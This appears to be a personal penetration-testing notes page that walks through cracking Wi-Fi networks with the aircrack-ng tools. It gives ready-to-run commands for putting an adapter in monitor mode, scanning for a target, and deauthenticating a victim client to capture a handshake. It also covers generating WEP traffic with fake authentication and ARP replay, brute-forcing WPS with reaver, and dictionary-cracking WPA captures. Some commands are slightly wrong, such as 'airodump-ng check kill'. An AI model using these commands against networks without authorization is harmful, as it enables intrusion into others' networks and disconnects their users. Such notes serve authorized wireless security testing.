---
icon: screwdriver-wrench
---

# Tools

## airodump-ng

### **Scanning**

Adapter must be in monitor mode

```bash
ifconfig wlan0 down
```

```bash
airodump-ng check kill
iwconfig mode monitor
ifconfig wlan0 up
```

* to sniff 5g, use `--band abg` (or whatever specific band you are looking for)

```bash
# Get new interface
iwconfig
airodump-ng --band abg [iface]
```

Get information of the network we are trying to crack

* BSSID
* Channel

{% code overflow="wrap" %}
```bash
airodump-ng --band abg --bssid [BSSID] -c [channel] -w [outfile] [iface]
```
{% endcode %}

### **Deauth Attack**

Disconnect a client from the networks (with scan running)

{% code overflow="wrap" %}
```bash
aireplay-ng -0 1 -a [AP mac address] -c [victim mac address] [iface]
```
{% endcode %}

* May need to run the deauth attack many times to get handshake, would be best to attempt against various targets

### Crack the capture file

```bash
aircrack-ng [filename].cap -w [wordlist]
```

### **WEP**

* run a specific airodump scan
* Need a high number of Data packets (IVs) to easily crack the key. Busier networks mean more data packets
  * if we don't have much traffic on the network, we can use fake auth packets to force the AP to generate IVs
  * associate to the network
    * `aireplay-ng --fakeauth 0 -a [AP BSSID] -h [my mac address] mon0`
  * arp replay
    * `aireplay-ng --arpreplay -b [AP BSSID] -h [my mac address] mon0`
    * wait for packets to fly
* `aircrack-ng [filename].cap`
* can use ascii or key with colons removed to connect to network

### **WPA/WPA2**

* _**WPS**_
  * discover WPS enabled devices
    * `wash --interface mon0`
  * brute with reaver
    * `reaver --bssid [AP mac address] --channel [network channel] --interface mon0 -vvv --no-associate`
    * if send\_packet bug, revert to older version of reaver
  * associate to network
    * `aireplay-ng --fakeauth 30 -a [AP BSSID] -h [my mac address] mon0`
      * we're increasing the timeout to 30 between association attempts so we don't get locked out
* _**Standard**_
  * run a specific airodump scan
  * wait for handshake to be captured or use short deauth attack (send 4 deauth packets)
  * run a dictionary attack with file containing handshake
    * `aircrack-ng [filename].cap -w [wordlist]`
